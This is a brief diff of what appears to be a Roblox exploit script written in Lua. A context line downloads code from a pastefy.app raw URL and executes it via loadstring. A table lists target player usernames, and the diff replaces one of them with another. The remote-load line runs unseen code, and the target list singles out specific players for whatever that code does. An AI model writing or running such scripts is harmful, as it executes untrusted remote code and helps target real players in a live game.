@@ -5,7 +5,7 @@ loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()
 -- 🎯 Add your target player names here
 local targetPlayers = {
     ["GAGpetstock28"] = true,
-    ["dinacr24"] = true,
+    ["4124214v"] = true,
     ["anotherplayer"] = true,
     
 }
